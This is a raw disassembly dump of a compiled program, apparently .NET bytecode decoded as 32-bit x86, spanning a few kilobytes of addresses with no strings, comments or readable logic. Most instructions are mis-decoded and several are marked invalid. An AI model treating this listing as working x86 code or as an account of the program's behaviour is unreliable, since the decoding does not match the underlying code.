  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 04             	or     0x4(%edx),%dh
  403d47:	22 00                	and    (%eax),%al
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 0a                	jb     0x403dcb
  403dc1:	22 00                	and    (%eax),%al
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 6a                	jb     0x403e3c
  403dd2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 74                	jb     0x403e56
  403de2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 82                	jb     0x403d74
  403df2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 0a 22 00       	and    $0x220a72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 6a                	jb     0x403e86
  403e1c:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	22 22                	and    (%edx),%ah
  403e28:	00 70 6f             	add    %dh,0x6f(%eax)
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 98                	jb     0x403deb
  403e53:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 0a 22 00       	and    $0x220a72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 a0                	jb     0x403e27
  403e87:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	b6 26                	mov    $0x26,%dh
  403e93:	00 70 6f             	add    %dh,0x6f(%eax)
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 98                	jb     0x403e35
  403e9d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 c4                	jb     0x403e9f
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 98                	jb     0x403e83
  403eeb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 98             	or     %esi,-0x68(%edx)
  403f1e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 c4                	jb     0x403ef2
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 98                	jb     0x403f80
  403fe8:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 ce             	or     -0x32(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 ea             	add    %dh,-0x16(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 f2                	jb     0x4040b7
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 20                	jb     0x404133
  404113:	27                   	daa
  404114:	00 70 73             	add    %dh,0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 68             	add    %dh,0x68(%edx)
  404180:	27                   	daa
  404181:	00 70 73             	add    %dh,0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
